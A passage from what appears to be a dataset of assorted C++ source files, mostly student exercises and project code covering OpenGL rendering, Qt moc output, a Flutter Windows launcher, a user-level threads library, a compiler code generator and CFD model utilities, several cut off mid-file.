angle - rr;\n\t}\n\t\n\n\n\tglutPostRedisplay();\n}\n\nint main(int argc, char** argv) {\n\tglutInit(&argc, argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB | GLUT_DEPTH);\n\tglutInitWindowPosition(10, 10);\n\tglutInitWindowSize(600, 600);\n\tglutCreateWindow(\"Swing\");\n\tinit();\n\tglutKeyboardFunc(keyPress);\n\tglutDisplayFunc(display);\n\tglutIdleFunc(animate);\n\tglutMainLoop();\n}",
    "#include <iostream> \n#include <filesystem> \nusing namespace std;\n/*\u00d1\u00f2\u00e2\u00ee\u00f0\u00b3\u00f2\u00fc \u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00f3 Product(\u00ed\u00e0\u00e7\u00e2\u00e0 \u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2\u00f3, \u00f6\u00b3\u00ed\u00e0, \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc, \u00ed\u00e0\u00ff\u00e2\u00ed\u00b3\u00f1\u00f2\u00fc \u00ed\u00e0 \u00f1\u00ea\u00eb\u00e0\u00e4\u00b3)\n\u00c7\u00e0\u00ef\u00e8\u00f8\u00b3\u00f2\u00fc \u00f3 \u00e1\u00b3\u00ed\u00e0\u00f0\u00ed\u00e8\u00e9 \u00f4\u00e0\u00e9\u00eb \u00ec\u00e0\u00f1\u00e8\u00e2 \u00ee\u00e1'\u00ba\u00ea\u00f2\u00b3\u00e2 \u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e8 \u00f2\u00e8\u00ef\u00f3 Product.\n\u00cf\u00f0\u00ee\u00f7\u00e8\u00f2\u00e0\u00e9\u00f2\u00e5 \u00bf\u00f5 \u00e7 \u00e1\u00b3\u00ed\u00e0\u00f0\u00ed\u00ee\u00e3\u00ee \u00f4\u00e0\u00e9\u00eb\u00f3.*/\nstruct Product\n{\n\tchar* name;\n\tdouble price;\n\tint amount;\n\tchar* stock;\n};\n void createProduct(Product& p)\n {\n\t cout << \"Name of the product: \";\n\t cin >> p.name;\n\t cout << \"NWhat is the price: \";\n\t cin >> p.price;\n\t cout << \"The amount: \";\n\t cin >> p.amount;\n\t cout << \"In or Out of stock: \";\n\t cin >> p.stock;\n }\nvoid showProduct(Product& p)\n{\n\tcout << \"Name: \"<<p.name;\n\tcout << \"Price: \" << p.price;\n\tcout << \"Amount: \"<<p.amount;\n\tcout << \"In/Out: \"<<p.stock;\n}\n\nint main()\n{\n\tint N;\n\tconst char* PATH_TO_FILE = \"product.txt\";\n\tcout << \"How many products do you wanr to add: \";\n\tcin >> N;\n\tProduct* list = new Product[N];\n\tFILE* file;\n\tfor (int i = 0; i < N; ++i) \n\t{\n\t\tcreateProduct(list[i]);\n\t}\n\n\tif (fopen_s(&file, PATH_TO_FILE, \"wb+\") == 0)\n\t{\n\t\tfwrite(list, sizeof(Product), N, file);\n\t\tProduct* new_list = new Product[N];\t\t\n\t\tfread(new_list, sizeof(Product), N, file);\n\t\tfor (int i = 0; i < N; i++)\n\t\t{\n\t\t\tshowProduct(new_list[i]);\n\t\t}\n\t\tfclose(file);\n\t}\n\n\n\t\n\n}",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint suma(int n1, int n2)\r\n{\r\n    int resultado = 0;\r\n    resultado = (n1 + n2);\r\n\r\n    return resultado;\r\n}\r\nint resta(int n1, int n2)\r\n{\r\n    int resultado = 0;\r\n    resultado = (n1 - n2);\r\n\r\n    return resultado;\r\n}\r\nint multiplicacion(int n1, int n2)\r\n{\r\n    int resultado = 0;\r\n    resultado = (n1 * n2);\r\n\r\n    return resultado;\r\n}\r\ndouble division(double n1, double n2)\r\n{\r\n    double resultado = 0;\r\n    resultado = (n1 / n2);\r\n\r\n    return resultado;\r\n}\r\ndouble media(double n1, double n2)\r\n{\r\n    double resultado = 0;\r\n    resultado = (n1 + n2) / 2;\r\n\r\n    return resultado;\r\n}\r\nint main()\r\n{\r\n    double n1, n2, respuesta, respuesta2, respuesta3, respuesta4, respuesta5;\r\n    n1 = 5;\r\n    n2 = 1;\r\n    respuesta = suma(n1, n2);\r\n    respuesta2 = resta(n1, n2);\r\n    respuesta3 = multiplicacion(n1, n2);\r\n    respuesta4 = division(n1, n2);\r\n    respuesta5 = media(n1, n2);\r\n\r\n    cout << \"El resultado de la suma es \" << respuesta << \"\\n\";\r\n    cout << \"El resultado de la resta es \" << respuesta2 << \"\\n\";\r\n    cout << \"El resultado de la multiplicacion es \" << respuesta3 << \"\\n\";\r\n    cout << \"El resultado de la division es \" << respuesta4 << \"\\n\";\r\n    cout << \"El resultado de la media es \" << respuesta5 << \"\\n\";\r\n\r\n    return 0;\r\n}\r\n",
    "// C++ Program to check even or odd using Bitwise opartors\n//4 Approaches\n\n//Sol 1: Using BITWISE AND\n\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n    int n;\n    cout<<\"Enter a number\"<<endl;\n    cin>>n;\n    if( (n & 1) == 0)\n      cout<<n << \" is EVEN\"<<endl;\n    else  \n    cout<<n << \" is ODD\"<<endl;\n    return 0;\n}\n\n\n//Sol 2: USING BITWISE OR\n\n// #include <iostream>\n// using namespace std;\n\n// int main()\n// {\n//     int n;\n//     cout<<\"Enter a number\"<<endl;\n//     cin>>n;\n//     if( (n | 1) > n)\n//       cout<<n << \" is EVEN\"<<endl;\n//     else          // ( (n | 1 ) == n)\n//     cout<<n << \" is ODD\"<<endl;\n//     return 0;\n// }\n\n\n// //SOL 3: USING BITWISE XOR\n\n// #include <iostream>\n// using namespace std;\n\n// int main()\n// {\n//     int n;\n//     cout<<\"Enter a number\"<<endl;\n//     cin>>n;\n//     if( (n ^ 1) == (n+1))\n//       cout<<n << \" is EVEN\"<<endl;\n//     else          // ( (n | 1 ) == (n-1))\n//     cout<<n << \" is ODD\"<<endl;\n//     return 0;\n// }\n\n\n\n//SOL 3: USING BITWISE RIght SHift (>>) and LEFT Shift (<<)\n\n// #include <iostream>\n// using namespace std;\n\n// int main()\n// {\n//     int n;\n//     cout<<\"Enter a number\"<<endl;\n//     cin>>n;\n//     int finalNumber = (n >> 1) << 1;\n//     if( finalNumber  == n)\n//       cout<<n << \" is EVEN\"<<endl;\n//     else          //  if( finalNumber  ! n)\n//     cout<<n << \" is ODD\"<<endl;\n//     return 0;\n// }",
    "/****************************************************************************\n** Meta object code from reading C++ file 'FluWatermark.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.7.1)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../../../FluentUI/FluWatermark.h\"\n#include <QtCore/qmetatype.h>\n\n#include <QtCore/qtmochelpers.h>\n\n#include <memory>\n\n\n#include <QtCore/qxptype_traits.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'FluWatermark.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.7.1. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSFluWatermarkENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSFluWatermarkENDCLASS = QtMocHelpers::stringData(\n    \"FluWatermark\",\n    \"QML.Element\",\n    \"textChanged\",\n    \"\",\n    \"gapChanged\",\n    \"offsetChanged\",\n    \"textColorChanged\",\n    \"rotateChanged\",\n    \"textSizeChanged\",\n    \"text\",\n    \"gap\",\n    \"offset\",\n    \"textColor\",\n    \"rotate\",\n    \"textSize\"\n);\n#else  // !QT_MOC_HAS_STRINGDATA\n#error \"qtmochelpers.h not found or too old.\"\n#endif // !QT_MOC_HAS_STRINGDATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSFluWatermarkENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       1,   14, // classinfo\n       6,   16, // methods\n       6,   58, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       6,       // signalCount\n\n // classinfo: key, value\n       1,    0,\n\n // signals: name, argc, parameters, tag, flags, initial metatype offsets\n       2,    0,   52,    3, 0x06,    7 /* Public */,\n       4,    0,   53,    3, 0x06,    8 /* Public */,\n       5,    0,   54,    3, 0x06,    9 /* Public */,\n       6,    0,   55,    3, 0x06,   10 /* Public */,\n       7,    0,   56,    3, 0x06,   11 /* Public */,\n       8,    0,   57,    3, 0x06,   12 /* Public */,\n\n // signals: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n // properties: name, type, flags\n       9, QMetaType::QString, 0x00015003, uint(0), 0,\n      10, QMetaType::QPoint, 0x00015003, uint(1), 0,\n      11, QMetaType::QPoint, 0x00015003, uint(2), 0,\n      12, QMetaType::QColor, 0x00015003, uint(3), 0,\n      13, QMetaType::Int, 0x00015003, uint(4), 0,\n      14, QMetaType::Int, 0x00015003, uint(5), 0,\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject FluWatermark::staticMetaObject = { {\n    QMetaObject::SuperData::link<QQuickPaintedItem::staticMetaObject>(),\n    qt_meta_stringdata_CLASSFluWatermarkENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSFluWatermarkENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_metaTypeArray<\n        // property 'text'\n        QString,\n        // property 'gap'\n        QPoint,\n        // property 'offset'\n        QPoint,\n        // property 'textColor'\n        QColor,\n        // property 'rotate'\n        int,\n        // property 'textSize'\n        int,\n        // Q_OBJECT / Q_GADGET\n        FluWatermark,\n        // method 'textChanged'\n        void,\n        // method 'gapChanged'\n        void,\n        // method 'offsetChanged'\n        void,\n        // method 'textColorChanged'\n        void,\n        // method 'rotateChanged'\n        void,\n        // method 'textSizeChanged'\n        void\n    >,\n    nullptr\n} };\n\nvoid FluWatermark::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<FluWatermark *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->textChanged(); break;\n        case 1: _t->gapChanged(); break;\n        case 2: _t->offsetChanged(); break;\n        case 3: _t->textColorChanged(); break;\n        case 4: _t->rotateChanged(); break;\n        case 5: _t->textSizeChanged(); break;\n        default: ;\n        }\n    } else if (_c == QMetaObject::IndexOfMethod) {\n        int *result = reinterpret_cast<int *>(_a[0]);\n        {\n            using _t = void (FluWatermark::*)();\n            if (_t _q_method = &FluWatermark::textChanged; *reinterpret_cast<_t *>(_a[1]) == _q_method) {\n                *result = 0;\n                return;\n            }\n        }\n        {\n            using _t = void (FluWatermark::*)();\n            if (_t _q_method = &FluWatermark::gapChanged; *reinterpret_cast<_t *>(_a[1]) == _q_method) {\n                *result = 1;\n                return;\n            }\n        }\n        {\n            using _t = void (FluWatermark::*)();\n            if (_t ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"appwriteauth\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n#include <iostream>\n#include <queue>\n#include <functional>\n#include \"uthreads.h\"\n\n#ifdef __x86_64__\n/* code for 64 bit Intel arch */\ntypedef unsigned long address_t;\n#define JB_SP 6\n#define JB_PC 7\n/* A translation is required when using an address of a variable.\n   Use this as a black box in your code. */\naddress_t translate_address(address_t addr)\n{\n  address_t ret;\n  asm volatile(\"xor    %%fs:0x30,%0\\n\"\n               \"rol    $0x11,%0\\n\"\n      : \"=g\" (ret)\n      : \"0\" (addr));\n  return ret;\n}\n#else\n/* code for 32 bit Intel arch */\n\ntypedef unsigned int address_t;\n#define JB_SP 4\n#define JB_PC 5\n\n\n/* A translation is required when using an address of a variable.\n   Use this as a black box in your code. */\naddress_t translate_address(address_t addr)\n{\n    address_t ret;\n    asm volatile(\"xor    %%gs:0x18,%0\\n\"\n                 \"rol    $0x9,%0\\n\"\n    : \"=g\" (ret)\n    : \"0\" (addr));\n    return ret;\n}\n#endif\n\ntypedef enum { READY, RUNNING, BLOCKED } STATUS;\n\ntypedef struct thread_t {\n    unsigned int tid;\n    STATUS status;\n    unsigned int quantum_count;\n    sigjmp_buf env;\n    char* start_of_stack_ptr;\n    // more pointers?\n} thread_t;\n\nint global_quantum_usecs;\nint current_tid;\nstd::queue<thread_t*> ready_queue;\nstd::map<unsigned int, thread_t*> threads_dict;\nstd::priority_queue<int, std::vector<int>, std::greater<int>> min_heap;\n\n/**\n * @brief initializes the thread library.\n *\n * Once this function returns, the main thread (tid == 0) will be set as RUNNING. There is no need to\n * provide an entry_point or to create a stack for the main thread - it will be using the \"regular\" stack and PC.\n * You may assume that this function is called before any other thread library function, and that it is called\n * exactly once.\n * The input to the function is the length of a quantum in micro-seconds.\n * It is an error to call this function with non-positive quantum_usecs.\n *\n * @return On success, return 0. On failure, return -1.\n*/\nint uthread_init(int quantum_usecs) {\n  if (quantum_usecs <= 0) {\n    return -1;\n  }\n  global_quantum_usecs = quantum_usecs;\n\n  // Initialize the min-heap with numbers from 1 to MAX_THREAD\n  for (int i = 1; i <= MAX_THREAD_NUM; ++i) {\n    min_heap.push(i);\n  }\n\n  // Create the main thread (tid == 0)\n  //TODO - we want to save \"main_thread\" like a global value\n  thread_t* main_thread = new thread_t;\n  if (main_thread == nullptr) {\n    return -1;\n  }\n  main_thread->tid = 0;\n  main_thread->status = RUNNING;\n//  sigsetjmp(main_thread->env,1); /* not really here */\n  threads_dict[main_thread->tid] = main_thread;\n  current_tid = main_thread->tid;\n  return 0;\n}\n\n\n/**\n * @brief Creates a new thread, whose entry point is the function entry_point with the signature\n * void entry_point(void).\n *\n * The thread is added to the end of the READY threads list.\n * The uthread_spawn function should fail if it would cause the number of concurrent threads to exceed the\n * limit (MAX_THREAD_NUM).\n * Each thread should be allocated with a stack of size STACK_SIZE bytes.\n * It is an error to call this function with a null entry_point.\n *\n * @return On success, return the ID of the created thread. On failure, return -1.\n*/\nint uthread_spawn(thread_entry_point entry_point) {\n  if(entry_point == nullptr || min_heap.empty()) {return -1;}\n\n  thread_t* new_thread = new thread_t;\n  if (new_thread == nullptr) { return -1;}\n\n  new_thread->start_of_stack_ptr = new char[STACK_SIZE];\n  if (new_thread->start_of_stack_ptr == nullptr) {\n    delete new_thread;\n    return -1;\n  }\n\n  new_thread->tid = min_heap.top();\n\n  address_t sp = (address_t) new_thread->start_of_stack_ptr + STACK_SIZE - sizeof(address_t);\n  address_t pc = (address_t) entry_point;\n  if (sigsetjmp(new_thread->env, 1) < 0) {\n    delete[] new_thread->start_of_stack_ptr;\n    delete new_thread;\n    return -1;\n  }\n  (new_thread->env->__jmpbuf)[JB_SP] = translate_address(sp);\n  (new_thread->env->__jmpbuf)[JB_PC] = translate_address(pc);\n//  sigemptyset(&new_thread->env->__saved_mask);\n  min_heap.pop();\n  ready_queue.push(new_thread);\n  threads_dict[new_thread->tid] = new_thread;\n  return new_thread->tid;\n}\n\n/**\n * @brief Terminates the thread with ID tid and deletes it from all relevant control structures.\n *\n * All the resources allocated by the library for this thread should be released. If no thread with ID tid exists it\n * is considered an error. Terminating the main thread (tid == 0) will result in the termination of the entire\n * process using exit(0) (after releasing the assigned library memory).\n *\n * @return The function returns 0 if the thread was successfully terminated and -1 otherwise. If a thread terminates\n * itself or the main thread is terminated, the function does not return.\n*/\nint uthread_terminate(int tid) {\n  if (tid < 0 || tid > MAX_THREAD_NUM) {\n    return -1;\n  }\n\n  else if (tid == 0) {\n    ;\n  }\n\n  else if (tid == current_tid) {\n    ;\n  }\n\n  // the easy case\n  else {\n    thread_t* target_thread = threads_dict[tid];\n    delete[] &(target_th",
    "#include \"CodeGenerator.hpp\"\n#include <iostream>\n\nnamespace Compiler {\n\nvoid IntermediateCodeGenerator::generate(const std::unique_ptr<ASTNode> &ast) {\n    if (ast) { visit(*ast); }\n}\n\nvoid IntermediateCodeGenerator::print() const {\n    for (const auto &quad : code) {\n        std::cout << \"(\" << quad.op << \", \" << quad.arg1 << \", \" << quad.arg2 << \", \"\n                  << quad.result << \")\\n\";\n    }\n}\n\nconst std::vector<Quadruple> &IntermediateCodeGenerator::getCode() const {\n    return code;\n}\n\nvoid IntermediateCodeGenerator::visit(const ASTNode &node) {\n    if (auto compoundNode = dynamic_cast<const CompoundStmtNode *>(&node)) {\n        visit(*compoundNode);\n    } else if (auto ifNode = dynamic_cast<const IfNode *>(&node)) {\n        visit(*ifNode);\n    } else if (auto ifElseNode = dynamic_cast<const IfElseNode *>(&node)) {\n        visit(*ifElseNode);\n    } else if (auto whileNode = dynamic_cast<const WhileNode *>(&node)) {\n        visit(*whileNode);\n    } else if (auto assignNode = dynamic_cast<const AssignNode *>(&node)) {\n        visit(*assignNode);\n    } else if (auto exprNode = dynamic_cast<const ExprNode *>(&node)) {\n        visit(*exprNode);\n    } else if (auto idNode = dynamic_cast<const IdentifierNode *>(&node)) {\n        visit(*idNode);\n    } else if (auto numNode = dynamic_cast<const NumberNode *>(&node)) {\n        visit(*numNode);\n    } else if (auto emptyNode = dynamic_cast<const EmptyNode *>(&node)) {\n        // emptyNode->print();\n    } else {\n        std::cerr << \"Unrecognized AST node type.\" << '\\n';\n    }\n}\n\nvoid IntermediateCodeGenerator::visit(const CompoundStmtNode &node) {\n    if (node.first) { visit(*node.first); }\n    if (node.second) { visit(*node.second); }\n}\n\nvoid IntermediateCodeGenerator::visit(const IfNode &node) {\n    visit(*node.condition);\n    std::string conditionResult = tempMap[node.condition.get()];\n\n    std::string labelEnd = \"L\" + std::to_string(lableCount++);\n\n    code.push_back(Quadruple(\"ifFalse\", conditionResult, \"\", labelEnd));\n    visit(*node.thenStmt);\n    code.push_back(Quadruple(\"label\", \"\", \"\", labelEnd));\n}\n\nvoid IntermediateCodeGenerator::visit(const IfElseNode &node) {\n    visit(*node.condition);\n    std::string conditionResult = tempMap[node.condition.get()];\n\n    std::string labelElse = \"L\" + std::to_string(lableCount++);\n    std::string labelEnd = \"L\" + std::to_string(lableCount++);\n\n    code.push_back(Quadruple(\"ifFalse\", conditionResult, \"\", labelElse));\n    visit(*node.thenStmt);\n    code.push_back(Quadruple(\"goto\", \"\", \"\", labelEnd));\n    code.push_back(Quadruple(\"label\", \"\", \"\", labelElse));\n    visit(*node.elseStmt);\n    code.push_back(Quadruple(\"label\", \"\", \"\", labelEnd));\n}\n\nvoid IntermediateCodeGenerator::visit(const WhileNode &node) {\n    std::string labelBegin = \"L\" + std::to_string(lableCount++);\n    std::string labelEnd = \"L\" + std::to_string(lableCount++);\n\n    code.push_back(Quadruple(\"label\", \"\", \"\", labelBegin));\n    visit(*node.condition);\n    std::string conditionResult = tempMap[node.condition.get()];\n\n    code.push_back(Quadruple(\"ifFalse\", conditionResult, \"\", labelEnd));\n    visit(*node.body);\n    code.push_back(Quadruple(\"goto\", \"\", \"\", labelBegin));\n    code.push_back(Quadruple(\"label\", \"\", \"\", labelEnd));\n}\n\nvoid IntermediateCodeGenerator::visit(const AssignNode &node) {\n    visit(*node.value);\n    std::string valueResult = tempMap[node.value.get()];\n    code.push_back(Quadruple(\"=\", valueResult, \"\", node.id.value));\n}\n\nvoid IntermediateCodeGenerator::visit(const ExprNode &node) {\n    visit(*node.left);\n    visit(*node.right);\n\n    std::string leftResult = tempMap[node.left.get()];\n    std::string rightResult = tempMap[node.right.get()];\n    std::string temp = newTemp();\n    tempMap[&node] = temp;\n\n    code.push_back(Quadruple(node.op.value, leftResult, rightResult, temp));\n}\n\nvoid IntermediateCodeGenerator::visit(const IdentifierNode &node) {\n    tempMap[&node] = node.id.value;\n}\n\nvoid IntermediateCodeGenerator::visit(const NumberNode &node) {\n    tempMap[&node] = node.value.value;\n}\n\nstd::string IntermediateCodeGenerator::newTemp() {\n    return \"t\" + std::to_string(tempCount++);\n}\n\n} // namespace Compiler\n",
    "#include <GL/glew.h>\n#include <GLFW/glfw3.h>\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <sstream>\n\nstruct ShaderProgramSource\n{\n    std::string VertexSource;\n    std::string FragmentSource;\n};\n/*\n * This reads the shader program in \n */\nstatic ShaderProgramSource ParseShader(const std::string& filepath)\n{\n    enum class ShaderType\n    {\n        NONE = -1, VERTEX = 0, FRAGMENT = 1\n    };\n    \n    std::ifstream stream(filepath);\n    std::string line;\n    std::stringstream ss[2];\n    ShaderType type = ShaderType::NONE;\n\n    while (getline(stream, line))\n    {\n        if (line.find(\"#shader\") != std::string::npos) {\n            if (line.find(\"vertex\") != std::string::npos)\n                type = ShaderType::VERTEX;\n            else if (line.find(\"fragment\") != std::string::npos)\n                type = ShaderType::FRAGMENT;\n        }\n        else\n        {\n            ss[(int)type] << line << '\\n'; // this way if the type is vertex, it adds to index 0 etc\n        }\n    }\n\n    return { ss[0].str(), ss[1].str() };\n}\n\nstatic unsigned int CompileShader(unsigned int type, const std::string& source)\n{\n    unsigned int id = glCreateShader(type);\n    const char* src = source.c_str(); // &source[0] does the same things, pointer to source char \n    const int SOURCE_CODE_COUNT = 1;\n    glShaderSource(id, SOURCE_CODE_COUNT, &src, nullptr);// specifies source for our shader\n    glCompileShader(id);\n\n    int result;\n    glGetShaderiv(id, GL_COMPILE_STATUS, &result);\n    if (result == GL_FALSE)\n    {\n        int length;\n        glGetShaderiv(id, GL_INFO_LOG_LENGTH, &length);\n        // char* message = (char*)alloca(length * sizeof(char)); this allows as to allocate on the stack dynamically\n        // we want to do char message[length], since length is a variable not a constant, we do this\n        // this can also solved by making it a heap and deleting it later like so, so assigning it to an unique pointer\n        char* message = new char[length];\n\n        glGetShaderInfoLog(id, length, &length, message);\n        std::cout << \"Failed to compile \" << \n            (type == GL_VERTEX_SHADER ? \"vertex\" : \"fragment\") \n            << \" shader\" << std::endl;\n        std::cout << message << std::endl;\n        glDeleteShader(id);\n\n        delete[] message;\n\n        return 0;\n    }\n\n    return id;\n}\n\n/*\n * Take in the shaderStrings and return an unique identifier\n*/\nstatic unsigned int CreateShader(const std::string& vertexShader, const std::string& fragmentShader)\n{\n    unsigned int program = glCreateProgram(); // in OpenGL unsigned int here might also be referred as GLuint\n    unsigned int vs = CompileShader(GL_VERTEX_SHADER, vertexShader);\n    unsigned int fs = CompileShader(GL_FRAGMENT_SHADER, fragmentShader);\n\n    glAttachShader(program, vs);\n    glAttachShader(program, fs);\n    glLinkProgram(program);\n    glValidateProgram(program);\n\n    glDeleteShader(vs);\n    glDeleteShader(fs);\n\n    return program;\n}\n\nint main(void)\n{\n    GLFWwindow* window;\n\n    /* Initialize the library */\n    if (!glfwInit())\n        return -1;\n\n    /* Create a windowed mode window and its OpenGL context */\n    window = glfwCreateWindow(640, 480, \"Hello World\", NULL, NULL);\n    if (!window)\n    {\n        glfwTerminate();\n        return -1;\n    }\n\n    /* Make the window's context current */\n    glfwMakeContextCurrent(window);\n\n    if (glewInit() != GLEW_OK)\n        std::cout << \"Error!\" << std::endl;\n\n    std::cout << glGetString(GL_VERSION) << std::endl;\n\n    const int NUM_POSITIONS = 4;\n    // Vertex buffer\n    float positions[NUM_POSITIONS * 2] = {\n        -0.5f, -0.5f, // 0\n         0.5f, -0.5f, // 1\n         0.5f,  0.5f, // 2\n        -0.5f,  0.5f  // 3\n    };\n\n    const int NUM_INDICES = 6;\n    // Index buffer\n    unsigned int indices[] = { // Note this has to be unsigned\n        0, 1, 2,\n        2, 3, 0\n    };\n\n    // Set vertex buffer to the GPU\n    unsigned int buffer;\n    glGenBuffers(1, &buffer); // this creates an id (unsigned int) for our 1 buffer and assign it to tghe variable buffer\n    glBindBuffer(GL_ARRAY_BUFFER, buffer); // binding means I'm about to work on it\n    glBufferData(GL_ARRAY_BUFFER, NUM_POSITIONS * 2 * sizeof(float), positions, GL_STATIC_DRAW);\n\n    // glBindBuffer(GL_ARRAY_BUFFER, 0); This is binding no \n\n    glEnableVertexAttribArray(0);\n    const int ATTRIBUTE_INDEX = 0;\n    glVertexAttribPointer(ATTRIBUTE_INDEX, 2, GL_FLOAT, GL_FALSE, sizeof(float) * 2, 0);\n\n    // Set index buffer to the GPU\n    unsigned int ibo; // Index buffer object\n    glGenBuffers(1, &ibo);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, ibo); \n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, NUM_INDICES * sizeof(unsigned int), indices, GL_STATIC_DRAW);\n\n    ShaderProgramSource source = ParseShader(\"res/shaders/Basic.shader\");\n    std::cout << \"Vertex\" << std::endl;\n    std::cout << source.VertexSource << std::endl;\n    std::cout << \"Fragment\" << std::endl;\n    std::cout << source.FragmentSource << std::endl;\n\n    unsigned int shader = CreateS",
    "/*---------------------------------------------------------------------------\n\tZaRan\t-\tA Totally Automatic CFD Software\n\tCopyright (C) ,Since 2020\n-------------------------------------------------------------------------------\nLicense\n\tThis file is part of ZaRan.\n\n!\t@file\t\tgird.h\n!\t@brief\tthe purpose of this file.\n!\t@author\tChen Jie.\n\\*---------------------------------------------------------------------------*/\n#include\"model/include/model.h\"\n#include \"utility/include/math.h\"\nvoid Model::AddMod(vector<std::shared_ptr<ModBase>> modVec)\n{\n\tfor (int iModel = 0; iModel < modVec.size(); ++iModel)\n\t\tAddMod(modVec[iModel]);\n}\nvoid Model::AddMod(Model* mod)\n{\n\tfor (int iModel = 0; iModel < mod->modelVec.size(); ++iModel)\n\t\tAddMod(mod->modelVec[iModel]);\n}\n\nbool Model::InModel(const Coordinate& pt)const\n{\n\tbool inMod = false;\n\tfor (int iModel = 0; iModel < modelVec.size(); ++iModel)\n\t{\n\t\tinMod = inMod || modelVec[iModel]->InModel(pt);//\u66f4\u65b0inMod\u7684\u503c\uff0c\u5982\u679c\u6709\u4e00\u4e2amodel\u5305\u542b\u70b9\uff0c\u5219\u8fd4\u56detrue\n\t}\n\treturn inMod;\n}\n\nvoid Model::GenPointCloud(const double delta)\n{\n\tfor (int iModel = 0; iModel < modelVec.size(); ++iModel)\n\t{\n\t\tmodelVec[iModel]->GenModelPoint(delta);\n\t}\n}\n\nCoordinate Model::GetClosestPoint(const Coordinate& pt)const\n{\n\tCoordinate NearPt = modelVec[0]->GetClosestPoint(pt);\n\tdouble min_dist = distance(NearPt, pt);\n\tCoordinate TmpPt;\n\tif (modelVec.size() > 0)\n\t{\n\t\tfor (int iModel = 1; iModel < modelVec.size(); ++iModel)\n\t\t{\n\t\t\tTmpPt = modelVec[iModel]->GetClosestPoint(pt);\n\t\t\tif (distance(TmpPt, pt) < min_dist)\n\t\t\t{\n\t\t\t\tmin_dist = distance(TmpPt, pt);\n\t\t\t\tNearPt = TmpPt;\n\t\t\t}\n\t\t}\n\t}\n\treturn NearPt;\n}\n\ndouble Model::NearestDistance(const Coordinate& pt)const\n{\n\tdouble minDistance = modelVec[0]->NearestDistance(pt);\n\tif (modelVec.size() > 0)\n\t{\n\t\tfor (int iModel = 1; iModel < modelVec.size(); ++iModel)\n\t\t{\n\t\t\tminDistance = Min(minDistance, modelVec[iModel]->NearestDistance(pt));\n\t\t}\n\t}\n\treturn minDistance;\n}\n\nconst ModBase& Model::GetModel(size_t iModel)const \n{ \n\tif (iModel < modelVec.size())\n\t{\n\t\treturn *modelVec[iModel];\n\t}\n\telse\n\t{\n\t\tthrow std::runtime_error(\"Model index out of range!\");\n\t}\n\t\n}\n\nconst std::shared_ptr<ModBase>& Model::GetOneModel(size_t iModel)const\n{\n\tif (iModel < modelVec.size())\n\t{\n\t\treturn modelVec[iModel];\n\t}\n\telse\n\t{\n\t\tthrow std::runtime_error(\"Model index out of range!\");\n\t}\n\n}",
